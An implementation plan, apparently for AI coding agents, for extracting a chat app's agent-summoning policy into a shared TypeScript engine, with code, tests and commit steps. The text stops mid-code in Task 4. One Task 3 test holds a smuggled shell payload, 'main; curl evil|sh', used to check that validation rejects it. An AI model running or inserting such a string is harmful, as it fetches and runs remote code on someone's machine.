# Desktop-Owned Summoner Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** The desktop app summons agents from its own live subscription while it is open — no sentinel required for mention/DM summons.

**Architecture:** Extract the sentinel's summon *policy* (mention parsing, authority, cooldown, self-summon guard, roster pre-invite/attestation, work-context resolution, restart-on-channel/line-move, spawn watchdog) into a host-agnostic `SummonEngine` in `@fezchat/protocol` (`src/agent/summon.ts`). The sentinel re-adopts the engine through a host adapter (herdr/detached spawn, pgrep liveness, its registry) with unchanged behavior. The desktop gains a second host adapter: a `spawn_agent` Tauri command spawns the bundled `~/.fez/bin/fez-agent` detached with a pid registry, and the webview feeds raw wire events to the engine — gated off whenever a sentinel is alive (one summoner per machine).

**Tech Stack:** TypeScript (engine + both hosts' TS sides), Rust/Tauri (spawn commands), vitest (engine tests in `packages/fez-evals/tests`), cargo (desktop crate).

**Spec:** `docs/superpowers/specs/2026-08-25-gui-desentinel-design.md` (workstream 1)

## Global Constraints

- Work in a fresh worktree branched from main (`git worktree add ../fez-summoner-wt -b desktop-summoner`); Ken has uncommitted work on main — never commit `src/agent/harness.ts` or touch `packages/fez-desktop` beyond the files this plan names.
- The engine must reproduce sentinel behavior exactly — the sentinel's current code is the oracle; any intentional divergence is a plan bug.
- Summon authority: the owner and attested siblings only; depth tag ≥ 5 (`MAX_CHAIN_DEPTH`) never summons (spec: "attested-sibling authority (47006 gate)").
- Agents spawn detached — never window-children (spec: "Detached, not window-children").
- One summoner per machine: the desktop defers entirely when `~/.fez/sentinel.pid` is alive (spec: "Double-spawn guard").
- Shell-safety: `isSafeWork` semantics unchanged (`^[\w][\w./-]{0,200}$`, no `..`); the Rust spawn command re-validates persona/repo/line (validation at the boundary, both sides).
- Spawn watchdog stays 90 seconds; desktop surface is a toast, sentinel surface stays the channel message.
- Commits: plain messages, NO Claude co-author/session trailers.
- Tests: engine tests in `packages/fez-evals/tests/` run with `npx vitest --run <file>` from `packages/fez-evals`. Rust: `cargo check` from `packages/fez-desktop/src-tauri`. Desktop TS: `npx tsc --noEmit` from `packages/fez-desktop` (if the package has a `check` script, use it).
- `packages/fez-sentinel` builds with its own `npm run build` (esbuild); it imports the engine from `@fezchat/protocol` like its other imports.

---

### Task 1: Move `summonMentions` + `isSafeWork` into `src/agent/summon.ts`

**Files:**
- Create: `src/agent/summon.ts`
- Modify: `packages/fez-sentinel/src/index.ts:51-78` (delete both functions; import from `@fezchat/protocol`)
- Modify: `src/index.ts` (add export line)
- Modify: `packages/fez-evals/tests/summon-mentions.test.ts:2` (import path)

**Interfaces:**
- Consumes: nothing.
- Produces (Tasks 2-6 rely on): `summonMentions(content: string): string[]`, `isSafeWork(value: string | undefined): boolean`, both exported from `@fezchat/protocol`.

- [ ] **Step 1: Create `src/agent/summon.ts` with the two functions moved verbatim**

```ts
/**
 * Summon policy shared by every summoning host (sentinel, desktop).
 * Extracted from fez-sentinel so the GUI can summon while open without
 * the daemon — one policy, two hosts, no drift.
 */

/**
 * A string safe to interpolate into a SHELL COMMAND — the repo/line an
 * agent is summoned onto reach a live terminal via herdr, so they are
 * validated like git validates refs: letters, digits, dot, dash, slash,
 * underscore, no `..`, bounded length. Not escaped — REFUSED. Exported
 * so the source (work-context resolution) and the sinks (herdr command
 * line, the desktop's Rust spawn) share ONE definition of "safe".
 */
export function isSafeWork(value: string | undefined): boolean {
  return !!value && /^[\w][\w./-]{0,200}$/.test(value) && !value.includes("..");
}

/**
 * Mention ≠ summon. An @name in PROSE is a call; one inside a code fence,
 * inline backticks, or quotes is speech ABOUT an agent (example text, tool
 * source, a quoted message) and must not spawn it. Unbalanced delimiters
 * fail open — a spare summon is harmless (the agent reads the thread and
 * stands down), a silently dropped one is a no-show.
 */
export function summonMentions(content: string): string[] {
  const prose = content
    .replace(/```[\s\S]*?```/g, " ")
    .replace(/`[^`\n]*`/g, " ")
    .replace(/"[^"\n]*"/g, " ")
    .replace(/“[^”\n]*”/g, " ");
  return [...new Set([...prose.matchAll(/@([\w-]+)/g)].map((m) => m[1].toLowerCase()))];
}
```

- [ ] **Step 2: Export from the root package**

In `src/index.ts`, next to the existing harness re-export (line ~49), add:

```ts
export { summonMentions, isSafeWork, SummonEngine } from "./agent/summon.js";
export type { SummonHost, SummonEvent, WorkContext, RegistryEntry } from "./agent/summon.js";
```

(The `SummonEngine`/types names don't exist until Task 2 — export only `summonMentions`/`isSafeWork` in THIS commit and extend the line in Task 2.)

- [ ] **Step 3: Point the sentinel at the shared module**

In `packages/fez-sentinel/src/index.ts`: delete the two function definitions (lines 51-78) and add `summonMentions, isSafeWork` to the existing `@fezchat/protocol` import list (lines 7-23). Keep a compat re-export at the top level of the file so nothing external breaks: `export { summonMentions, isSafeWork } from "@fezchat/protocol";`

- [ ] **Step 4: Update the test import**

`packages/fez-evals/tests/summon-mentions.test.ts:2` becomes:

```ts
import { summonMentions } from "../../../src/agent/summon.js";
```

(Root-src relative import is the established pattern for fez-evals tests against `src/`.)

- [ ] **Step 5: Run the tests + builds**

Run: `cd packages/fez-evals && npx vitest --run tests/summon-mentions.test.ts` — expected PASS unchanged.
Run: `cd packages/fez-sentinel && npm run build` — expected clean.
Run: `npm run check` at repo root if a check script exists (else `npx tsc --noEmit`).

- [ ] **Step 6: Commit**

```bash
git add src/agent/summon.ts src/index.ts packages/fez-sentinel/src/index.ts packages/fez-evals/tests/summon-mentions.test.ts
git commit -m "summon: extract mention parsing + shell-safety into shared @fezchat/protocol module"
```

---

### Task 2: `SummonEngine` core — channel-message path

**Files:**
- Modify: `src/agent/summon.ts` (append engine)
- Modify: `src/index.ts` (extend the export line from Task 1 Step 2 to its full form)
- Test: `packages/fez-evals/tests/summon-engine.test.ts`

**Interfaces:**
- Consumes: Task 1's functions.
- Produces (Tasks 3-6 rely on — exact shapes):

```ts
export interface SummonEvent { id?: string; kind: number; pubkey: string; content: string; tags: string[][]; created_at?: number }
export interface WorkContext { repo: string; line?: string }
export interface RegistryEntry { channels: string[]; work?: WorkContext }
export interface SummonHost {
  ownerPubkey: string;
  personaExists(name: string): boolean | Promise<boolean>;
  personaPubkey(name: string): Promise<string | undefined>;
  agentAlive(name: string): boolean | Promise<boolean>;
  registryEntry(name: string): RegistryEntry | undefined | Promise<RegistryEntry | undefined>;
  spawn(persona: string, channels: string[], work?: WorkContext): Promise<void>;
  restart(persona: string, channels: string[], work?: WorkContext): Promise<void>;
  query(filters: object[]): Promise<SummonEvent[]>;
  publish(template: { kind: number; tags: string[][]; content: string; created_at?: number }): Promise<void>;
  announceTimeout(persona: string, channelId: string): void;
  log?(line: string): void;
}
new SummonEngine(host: SummonHost, opts?: { cooldownMs?: number; maxChainDepth?: number; watchdogMs?: number })
engine.handleEvent(event: SummonEvent): Promise<void>   // dispatches 47000/47103/40101
engine.handleGiftWrapRecipient(recipientPk: string): Promise<void>
engine.noteAnnouncement(pubkey: string, name: string): void
engine.noteAttestation(pubkey: string): void
engine.seedRosters(): Promise<void>   // 47000 + own 47006 hydration
```

- [ ] **Step 1: Write the failing tests**

`packages/fez-evals/tests/summon-engine.test.ts`:

```ts
import { describe, it, expect, vi, beforeEach } from "vitest";
import { SummonEngine, type SummonHost, type SummonEvent } from "../../../src/agent/summon.js";

const OWNER = "aa".repeat(32);
const SIBLING = "bb".repeat(32);
const STRANGER = "cc".repeat(32);
const SCOUT_PK = "dd".repeat(32);

function makeHost(over: Partial<SummonHost> = {}) {
  const spawned: { persona: string; channels: string[]; work?: unknown }[] = [];
  const published: { kind: number; tags: string[][]; content: string }[] = [];
  const host: SummonHost = {
    ownerPubkey: OWNER,
    personaExists: (n) => ["scout", "vault"].includes(n),
    personaPubkey: async (n) => (n === "scout" ? SCOUT_PK : undefined),
    agentAlive: () => false,
    registryEntry: () => undefined,
    spawn: async (persona, channels, work) => { spawned.push({ persona, channels, work }); },
    restart: async (persona, channels, work) => { spawned.push({ persona, channels, work }); },
    query: async () => [],
    publish: async (t) => { published.push(t); },
    announceTimeout: () => {},
    ...over,
  };
  return { host, spawned, published };
}

const msg = (pubkey: string, content: string, extra: string[][] = []): SummonEvent => ({
  kind: 47103, pubkey, content, tags: [["h", "chan1"], ...extra],
});

describe("SummonEngine — channel messages", () => {
  beforeEach(() => vi.useRealTimers());

  it("owner mention of an existing persona spawns it into the channel", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "hey @scout look at this"));
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: undefined }]);
  });

  it("stranger mentions never summon; attested siblings do", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(STRANGER, "@scout go"));
    expect(spawned).toHaveLength(0);
    engine.noteAttestation(SIBLING);
    await engine.handleEvent(msg(SIBLING, "@scout go"));
    expect(spawned).toHaveLength(1);
  });

  it("depth >= 5 never summons", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go", [["depth", "5"]]));
    expect(spawned).toHaveLength(0);
  });

  it("unknown personas and code-fenced mentions are ignored", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@nobody and `@scout` in backticks"));
    expect(spawned).toHaveLength(0);
  });

  it("an agent's own message never summons it (self-summon guard)", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(SCOUT_PK, "@scout failed to start"));
    expect(spawned).toHaveLength(0);
  });

  it("cooldown suppresses a re-summon inside the window", async () => {
    vi.useFakeTimers();
    // agentAlive stays false (the first spawn 'died'): only the cooldown
    // stands between the two mentions.
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host, { cooldownMs: 15_000 });
    await engine.handleEvent(msg(OWNER, "@scout go"));
    await engine.handleEvent(msg(OWNER, "@scout go again"));
    expect(spawned).toHaveLength(1);
    await vi.advanceTimersByTimeAsync(16_000);
    await engine.handleEvent(msg(OWNER, "@scout third time"));
    expect(spawned).toHaveLength(2);
    vi.useRealTimers();
  });

  it("a message with no h tag never summons", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent({ kind: 47103, pubkey: OWNER, content: "@scout", tags: [] });
    expect(spawned).toHaveLength(0);
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd packages/fez-evals && npx vitest --run tests/summon-engine.test.ts`
Expected: FAIL — `SummonEngine` is not exported.

- [ ] **Step 3: Implement the engine core (append to `src/agent/summon.ts`)**

The logic is the sentinel's, parameterized by host. Transcribe:

```ts
export interface SummonEvent {
  id?: string;
  kind: number;
  pubkey: string;
  content: string;
  tags: string[][];
  created_at?: number;
}
export interface WorkContext { repo: string; line?: string }
export interface RegistryEntry { channels: string[]; work?: WorkContext }

export interface SummonHost {
  ownerPubkey: string;
  personaExists(name: string): boolean | Promise<boolean>;
  personaPubkey(name: string): Promise<string | undefined>;
  agentAlive(name: string): boolean | Promise<boolean>;
  registryEntry(name: string): RegistryEntry | undefined | Promise<RegistryEntry | undefined>;
  spawn(persona: string, channels: string[], work?: WorkContext): Promise<void>;
  /** Kill the running instance, then spawn with these channels/work. */
  restart(persona: string, channels: string[], work?: WorkContext): Promise<void>;
  query(filters: object[]): Promise<SummonEvent[]>;
  /** Publish signed AS THE OWNER — attestations, roster updates. */
  publish(template: { kind: number; tags: string[][]; content: string; created_at?: number }): Promise<void>;
  /** Watchdog surface: persona never announced within watchdogMs. */
  announceTimeout(persona: string, channelId: string): void;
  log?(line: string): void;
}

const KIND_METADATA = 47000;
const KIND_ATTESTATION = 47006;
const KIND_MESSAGE = 47103;
const KIND_DOC_COMMENT = 40101;
const KIND_MEMBERSHIP = 47102;
const ROSTER_D = "roster";

const safeWork = (value: string | undefined): string | undefined =>
  isSafeWork(value) ? value : undefined;

export class SummonEngine {
  private readonly cooldownMs: number;
  private readonly maxChainDepth: number;
  private readonly watchdogMs: number;
  private readonly agentPkToName = new Map<string, string>();
  private readonly attestedSiblings = new Set<string>();
  private readonly attested = new Set<string>();
  private readonly spawning = new Set<string>();
  private readonly pendingInvites = new Map<string, { channelId: string }>();
  private readonly lastSummonAt = new Map<string, number>();

  constructor(
    private readonly host: SummonHost,
    opts?: { cooldownMs?: number; maxChainDepth?: number; watchdogMs?: number }
  ) {
    this.cooldownMs = opts?.cooldownMs ?? 15_000;
    this.maxChainDepth = opts?.maxChainDepth ?? 5;
    this.watchdogMs = opts?.watchdogMs ?? 90_000;
  }

  private log(line: string): void {
    this.host.log?.(line);
  }

  noteAnnouncement(pubkey: string, name: string): void {
    this.agentPkToName.set(pubkey, name.toLowerCase());
  }

  noteAttestation(pubkey: string): void {
    this.attestedSiblings.add(pubkey);
  }

  nameOf(pk: string): string {
    return this.agentPkToName.get(pk) ?? `${pk.slice(0, 8)}…`;
  }

  /** Hydrate announced names + our own attestations (sentinel boot parity). */
  async seedRosters(): Promise<void> {
    const [metadataEvents, attestations] = await Promise.all([
      this.host.query([{ kinds: [KIND_METADATA], limit: 200 }]),
      this.host.query([{ kinds: [KIND_ATTESTATION], authors: [this.host.ownerPubkey] }]),
    ]);
    for (const event of metadataEvents) {
      try {
        const name = JSON.parse(event.content).name?.toLowerCase();
        if (name) this.agentPkToName.set(event.pubkey, name);
      } catch { /* ignore */ }
    }
    for (const event of attestations) {
      const pk = event.tags.find((t) => t[0] === "p")?.[1];
      if (pk) this.attestedSiblings.add(pk);
    }
  }

  async handleEvent(event: SummonEvent): Promise<void> {
    if (event.kind === KIND_METADATA) return this.handleAnnouncement(event);
    if (event.kind === KIND_DOC_COMMENT) return this.handleDocComment(event);
    if (event.kind === KIND_MESSAGE) return this.handleChannelMessage(event);
  }

  private authorized(pubkey: string): boolean {
    return pubkey === this.host.ownerPubkey || this.attestedSiblings.has(pubkey);
  }

  private async handleChannelMessage(event: SummonEvent): Promise<void> {
    if (!this.authorized(event.pubkey)) return;
    if (Number(event.tags.find((t) => t[0] === "depth")?.[1] ?? 0) >= this.maxChainDepth) return;
    const channelId = event.tags.find((t) => t[0] === "h")?.[1];
    if (!channelId) return;
    const work = await this.workContextOf(event, channelId);
    for (const persona of summonMentions(event.content)) {
      if (this.spawning.has(persona) || !(await this.host.personaExists(persona))) continue;
      // An agent mentioning ITSELF (its dying "failed to start" words, or
      // any self-reference) is not a summon — else a spawn-death loops.
      if ((await this.host.personaPubkey(persona)) === event.pubkey) continue;
      if (await this.host.agentAlive(persona)) {
        await this.maybeRestart(persona, channelId, work);
        continue;
      }
      this.pendingInvites.set(persona, { channelId });
      await this.summon(persona, [channelId], `mention by ${this.nameOf(event.pubkey)}`, work);
    }
  }

  private async summon(persona: string, channels: string[], why: string, work?: WorkContext): Promise<void> {
    const last = this.lastSummonAt.get(persona);
    if (last !== undefined && Date.now() - last < this.cooldownMs) {
      this.log(`⏳ summon for @${persona} suppressed — cooldown (${why})`);
      return;
    }
    this.lastSummonAt.set(persona, Date.now());
    this.spawning.add(persona);
    this.log(`✨ ${why} → summoning @${persona}${work ? ` onto ${work.repo}:${work.line}` : ""}`);
    try {
      await this.preInvite(persona);
      await this.host.spawn(persona, channels, work);
      this.armWatchdog(persona, channels[0]);
    } catch (err) {
      this.log(`⚠️  couldn't summon @${persona}: ${err instanceof Error ? err.message : err}`);
    } finally {
      this.spawning.delete(persona);
    }
  }

  private armWatchdog(persona: string, channelId: string | undefined): void {
    if (!channelId) return;
    const timer = setTimeout(() => {
      void (async () => {
        if (!this.pendingInvites.has(persona) || (await this.host.agentAlive(persona))) return;
        this.pendingInvites.delete(persona);
        this.host.announceTimeout(persona, channelId);
      })();
    }, this.watchdogMs);
    (timer as { unref?: () => void }).unref?.();
  }
}
```

`maybeRestart`, `workContextOf`, `preInvite`, `handleAnnouncement`, `handleDocComment`, and `handleGiftWrapRecipient` land in Task 3 — for THIS commit stub the three referenced ones so it compiles:

```ts
  private async maybeRestart(_persona: string, _channelId: string, _work?: WorkContext): Promise<void> {}
  private async workContextOf(_event: SummonEvent, _channelId: string): Promise<WorkContext | undefined> { return undefined; }
  private async preInvite(_persona: string): Promise<void> {}
  private async handleAnnouncement(_event: SummonEvent): Promise<void> {}
  private async handleDocComment(_event: SummonEvent): Promise<void> {}
  async handleGiftWrapRecipient(_recipientPk: string): Promise<void> {}
```

Extend `src/index.ts`'s export to the full form given in the Interfaces block of Task 1 Step 2.

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd packages/fez-evals && npx vitest --run tests/summon-engine.test.ts tests/summon-mentions.test.ts` — expected PASS.

- [ ] **Step 5: Commit**

```bash
git add src/agent/summon.ts src/index.ts packages/fez-evals/tests/summon-engine.test.ts
git commit -m "summon: SummonEngine core — authority, depth, cooldown, self-summon guard, watchdog"
```

---

### Task 3: Engine completion — announcements, doc comments, DMs, work context, restart-union, pre-invite

**Files:**
- Modify: `src/agent/summon.ts` (replace Task 2's stubs)
- Test: `packages/fez-evals/tests/summon-engine.test.ts` (append)

**Interfaces:**
- Consumes: Task 2's engine + host.
- Produces: the completed engine — same public surface, stubs become real. Behavior oracle: `packages/fez-sentinel/src/index.ts` lines 500-536 (`workContextOf`), 538-575 (`handleChannelMentions` restart-union), 463-476 (`preInvite`), 317-346 (`attestAgent`/`inviteToWorkspace`), 586-621 (announce + doc-comment handling), 649-653 (gift-wrap summon).

- [ ] **Step 1: Append the failing tests**

```ts
describe("SummonEngine — completion paths", () => {
  it("announcement of a pending persona publishes attestation + roster invite", async () => {
    const { host, published, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout go"));
    expect(spawned).toHaveLength(1);
    await engine.handleEvent({ kind: 47000, pubkey: SCOUT_PK, content: JSON.stringify({ name: "scout" }), tags: [] });
    const kinds = published.map((p) => p.kind).sort();
    // pre-invite (at spawn) and the announce path both run; with the mock
    // roster query returning [], both may publish — the assertion is that
    // attestation and roster invite happened at all, not their count.
    expect(kinds).toContain(47006);
    expect(kinds).toContain(47102);
  });

  it("doc-comment mentions summon with the same authority rules", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleEvent({ kind: 40101, pubkey: STRANGER, content: "@scout fix this", tags: [["h", "chan1"]] });
    expect(spawned).toHaveLength(0);
    await engine.handleEvent({ kind: 40101, pubkey: OWNER, content: "@scout fix this", tags: [["h", "chan1"]] });
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: undefined }]);
  });

  it("gift wrap for a sleeping announced agent summons it with its registry channels", async () => {
    const { host, spawned } = makeHost({ registryEntry: () => ({ channels: ["chanX"] }) });
    const engine = new SummonEngine(host);
    engine.noteAnnouncement(SCOUT_PK, "scout");
    await engine.handleGiftWrapRecipient(SCOUT_PK);
    expect(spawned).toEqual([{ persona: "scout", channels: ["chanX"], work: undefined }]);
  });

  it("gift wrap for an unannounced pubkey does nothing", async () => {
    const { host, spawned } = makeHost();
    const engine = new SummonEngine(host);
    await engine.handleGiftWrapRecipient(STRANGER);
    expect(spawned).toHaveLength(0);
  });

  it("running agent mentioned in a NEW channel restarts with the union", async () => {
    const restarts: unknown[] = [];
    const { host, spawned } = makeHost({
      agentAlive: () => true,
      registryEntry: () => ({ channels: ["chanOld"] }),
      restart: async (persona, channels, work) => { restarts.push({ persona, channels, work }); },
    });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout come here"));
    expect(spawned).toHaveLength(0);
    expect(restarts).toEqual([{ persona: "scout", channels: ["chanOld", "chan1"], work: undefined }]);
  });

  it("running agent already serving the channel is left alone", async () => {
    const restarts: unknown[] = [];
    const { host, spawned } = makeHost({
      agentAlive: () => true,
      registryEntry: () => ({ channels: ["chan1"] }),
      restart: async (...a) => { restarts.push(a); },
    });
    const engine = new SummonEngine(host);
    await engine.handleEvent(msg(OWNER, "@scout ping"));
    expect(spawned).toHaveLength(0);
    expect(restarts).toHaveLength(0);
  });

  it("work context: repo channel + ⑂ thread root resolve to {repo, line}; hostile strings degrade", async () => {
    const channelEvent = {
      kind: 47101, pubkey: OWNER, created_at: 10, tags: [],
      content: JSON.stringify({ source: "fez-git", meta: { repo: "cool-repo" } }),
    };
    const rootEvent = { kind: 47103, pubkey: OWNER, content: "⑂ `agent/fix-thing`", tags: [] };
    const queryImpl = async (filters: object[]) => {
      const f = filters[0] as { kinds?: number[]; ids?: string[] };
      if (f.kinds?.includes(47101)) return [channelEvent as SummonEvent];
      if (f.ids) return [rootEvent as SummonEvent];
      return [];
    };
    const { host, spawned } = makeHost({ query: queryImpl });
    await new SummonEngine(host).handleEvent(msg(OWNER, "@scout do it", [["e", "rootid", "", "root"]]));
    expect(spawned).toEqual([{ persona: "scout", channels: ["chan1"], work: { repo: "cool-repo", line: "fix-thing" } }]);

    // hostile line name degrades to repo-only — nothing of it reaches spawn
    rootEvent.content = "⑂ `main; curl evil|sh`";
    const { host: h2, spawned: s2 } = makeHost({ query: queryImpl });
    await new SummonEngine(h2).handleEvent(msg(OWNER, "@vault do it", [["e", "rootid", "", "root"]]));
    expect(s2[0]).toEqual({ persona: "vault", channels: ["chan1"], work: { repo: "cool-repo" } });
  });
});
```

- [ ] **Step 2: Run tests to verify the new ones fail**

Run: `cd packages/fez-evals && npx vitest --run tests/summon-engine.test.ts` — Task 2 tests PASS, new ones FAIL.

- [ ] **Step 3: Replace the stubs with the real implementations**

```ts
  private async handleAnnouncement(event: SummonEvent): Promise<void> {
    let name: string | undefined;
    try {
      name = JSON.parse(event.content).name?.toLowerCase();
    } catch { return; }
    if (!name) return;
    this.agentPkToName.set(event.pubkey, name);
    if (await this.host.registryEntry(name)) this.attestAgent(event.pubkey);
    const target = this.pendingInvites.get(name);
    if (target) {
      this.pendingInvites.delete(name);
      this.attestAgent(event.pubkey);
      try {
        await this.inviteToWorkspace(event.pubkey);
        this.log(`🤝 @${name} announced — invited to its channel`);
      } catch {
        this.log(`⚠️  invite for @${name} failed`);
      }
    }
  }

  private async handleDocComment(event: SummonEvent): Promise<void> {
    if (!this.authorized(event.pubkey)) return;
    const channelId = event.tags.find((t) => t[0] === "h")?.[1];
    if (!channelId) return;
    for (const persona of summonMentions(event.content)) {
      if (this.spawning.has(persona) || !(await this.host.personaExists(persona)) || (await this.host.agentAlive(persona))) continue;
      this.pendingInvites.set(persona, { channelId });
      await this.summon(persona, [channelId], `doc comment by ${this.nameOf(event.pubkey)}`);
    }
  }

  async handleGiftWrapRecipient(recipientPk: string): Promise<void> {
    const persona = this.agentPkToName.get(recipientPk);
    if (!persona) return;
    if (this.spawning.has(persona) || !(await this.host.personaExists(persona)) || (await this.host.agentAlive(persona))) return;
    const prior = await this.host.registryEntry(persona);
    await this.summon(persona, prior?.channels ?? [], "DM for a sleeping agent");
  }

  /** Running, but summoned into a channel it doesn't serve — or onto a
   * DIFFERENT line: one process per persona, one body per line, so a
   * line switch is a restart. */
  private async maybeRestart(persona: string, channelId: string, work?: WorkContext): Promise<void> {
    const entry = await this.host.registryEntry(persona);
    if (!entry) return;
    const needsChannel = !entry.channels.includes(channelId);
    const needsLine = work !== undefined && (entry.work?.repo !== work.repo || (work.line !== undefined && entry.work?.line !== work.line));
    if (!needsChannel && !needsLine) return;
    this.spawning.add(persona);
    this.pendingInvites.set(persona, { channelId });
    this.log(needsLine ? `🔁 moving @${persona} onto line ${work?.line} (restart)` : `🔁 pulling @${persona} into a new channel (restart with union)`);
    try {
      await this.host.restart(persona, needsChannel ? [...entry.channels, channelId] : entry.channels, work ?? entry.work);
    } finally {
      this.spawning.delete(persona);
    }
  }

  private attestAgent(agentPubkey: string): void {
    if (this.attested.has(agentPubkey) || agentPubkey === this.host.ownerPubkey) return;
    this.attested.add(agentPubkey);
    this.attestedSiblings.add(agentPubkey);
    void this.host
      .publish({ kind: KIND_ATTESTATION, tags: [["p", agentPubkey]], content: "" })
      .catch(() => this.attested.delete(agentPubkey));
  }

  private async inviteToWorkspace(agentPubkey: string): Promise<void> {
    const rosters = await this.host.query([{ kinds: [KIND_MEMBERSHIP], "#d": [ROSTER_D] }]);
    const latest = rosters.sort((a, b) => (a.created_at ?? 0) - (b.created_at ?? 0)).at(-1);
    const ptags = latest?.tags.filter((t) => t[0] === "p") ?? [];
    if (ptags.some((t) => t[1] === agentPubkey)) return;
    ptags.push(["p", agentPubkey, "bot"]);
    await this.host.publish({
      kind: KIND_MEMBERSHIP,
      tags: [["d", ROSTER_D], ...ptags],
      content: "",
      created_at: Math.max(Math.floor(Date.now() / 1000), (latest?.created_at ?? 0) + 1),
    });
  }

  /** Roster the persona BEFORE its process exists (sentinel's preInvite —
   * a repo agent's first act is cloning and the clone is roster-gated). */
  private async preInvite(persona: string): Promise<void> {
    try {
      const pk = await this.host.personaPubkey(persona);
      if (!pk) return;
      await this.inviteToWorkspace(pk);
      this.attestAgent(pk);
    } catch (err) {
      this.log(`⚠️  pre-invite for @${persona} failed: ${err instanceof Error ? err.message : err}`);
    }
  }

  private async workContextOf(event: SummonEvent, channelId: string): Promise<WorkContext | undefined> {
    try {
      const chans = await this.host.query([{ kinds: [47101], "#d": [channelId], authors: [this.host.ownerPubkey] }]);
      const latest = chans.sort((a, b) => (b.created_at ?? 0) - (a.created_at ?? 0))[0];
      if (!latest) return undefined;
      const parsed = JSON.parse(latest.content) as { source?: string; meta?: { repo?: string } };
      if (parsed.source !== "fez-git") return undefined;
      const repo = safeWork(parsed.meta?.repo);
      if (!repo) return undefined;
      const eTags = event.tags.filter((t) => t[0] === "e" && t[1]);
      const rootId = (eTags.find((t) => t[3] === "root") ?? eTags[0])?.[1];
      if (!rootId) return { repo };
      const [root] = await this.host.query([{ ids: [rootId] }]);
      const marker = root?.content?.match(/^⑂ `([^`]+)`/);
      if (!marker) return { repo };
      const branch = marker[1];
      const line = safeWork(branch.includes("/") ? branch.slice(branch.indexOf("/") + 1) : branch);
      return line ? { repo, line } : { repo };
    } catch {
      return undefined;
    }
  }
```

- [ ] **Step 4: Run the full engine suite**

Run: `cd packages/fez-evals && npx vitest --run tests/summon-engine.test.ts tests/summon-mentions.test.ts` — expected PASS.

- [ ] **Step 5: Commit**

```bash
git add src/agent/summon.ts packages/fez-evals/tests/summon-engine.test.ts
git commit -m "summon: engine completion — announce/doc/DM paths, work context, restart-union, pre-invite"
```

---

### Task 4: Sentinel adopts the engine

**Files:**
- Modify: `packages/fez-sentinel/src/index.ts` (replace lines 289-665's summon machinery with an engine host; KEEP notifications, schedules, extension tasks untouched)

**Interfaces:**
- Consumes: `SummonEngine`/`SummonHost` from `@fezchat/protocol` (Task 3 surface).
- Produces: a sentinel with identical behavior. The deleted blocks are exactly: `agentPkToName/attestedSiblings/attested/nameOf` (290-293), `attestAgent` (317-324), `inviteToWorkspace` (332-346), the metadata/attestation boot queries (348-362), `spawning/pendingInvites` (365-366), `personaPkCache/personaPubkey` (378-392), `lastSummonAt/SUMMON_COOLDOWN_MS/summon` (399-422), `armSpawnWatchdog` (433-449), `preInvite` (463-476), `safeWork/workContextOf` (497-536), `handleChannelMentions` (538-575), and the summon branches of the subscribe callback (586-654). NOT deleted: `buildTaskNostr`, `deliver`, herdr plumbing, `spawnAgent`, `agentEnvCmd`, registry fns, `personaExists`, `agentProcessAlive`, schedules, extension tasks.

- [ ] **Step 1: Build the host and engine in `main()` (after `myPubkey` is known)**

```ts
  const { SummonEngine } = await import("@fezchat/protocol");
  const engine = new SummonEngine(
    {
      ownerPubkey: myPubkey,
      personaExists,
      personaPubkey: async (persona: string) => {
        const { loadOrCreateKey } = await import("@fezchat/protocol");
        const { getPublicKey } = await import("nostr-tools/pure");
        try {
          const hexKey = loadOrCreateKey(`agent:${persona}`);
          return getPublicKey(Uint8Array.from(hexKey.match(/../g)!.map((b) => parseInt(b, 16))));
        } catch {
          return undefined;
        }
      },
      agentAlive: agentProcessAlive,
      registryEntry: (persona: string) => {
        const t = loadRegistry().find((x) => x.persona === persona);
        return t ? { channels: t.channels, work: t.work } : undefined;
      },
      spawn: (persona, channels, work) => spawnAgent(persona, channels, work),
      restart: async (persona, channels, work) => {
        try { execSync(`pkill -f "(fez|cli\\.js) agent ${persona}"`, { stdio: "pipe" }); } catch { /* already gone */ }
        await spawnAgent(persona, channels, work);
      },
      query: (filters) => relay.query(filters as never) as never,
      publish: async (template) => {
        await relay.publish(client.signEvent(template as never));
      },
      announceTimeout: (persona, channelId) => {
        console.error(`⚠️  @${persona} never started (no announce, no process)`);
        void relay
          .publish(
            client.signEvent({
              kind: KIND_CHANNEL_MESSAGE,
              tags: [["h", channelId]],
              content: `⚠️ \`${persona}\` failed to start — its process died before announcing (check its herdr tab or ~/.fez/logs/${persona}.log)`,
            })
          )
          .catch(() => {});
      },
      log: (line) => console.log(line),
    },
    {}
  );
  await engine.seedRosters();
```

- [ ] **Step 2: Rewrite the subscribe callback to notifications + engine dispatch**

The subscription filters stay identical (lines 577-584). The callback becomes:

```ts
    (event) => {
      if (event.kind === KIND_AGENT_METADATA) {
        void engine.handleEvent(event as never);
        return;
      }
      if (event.kind === KIND_DOC_COMMENT) {
        if (event.pubkey !== myPubkey && event.tags.some((t) => t[0] === "p" && t[1] === myPubkey)) {
          deliver(`@${engine.nameOf(event.pubkey)} commented on a doc`, event.content.slice(0, 90));
        }
        void engine.handleEvent(event as never);
        return;
      }
      if (event.kind === KIND_CHANNEL_MESSAGE) {
        if (event.pubkey !== myPubkey && event.tags.some((t) => t[0] === "p" && t[1] === myPubkey)) {
          deliver(`@${engine.nameOf(event.pubkey)} mentioned you`, event.content.slice(0, 90));
        }
        void engine.handleEvent(event as never);
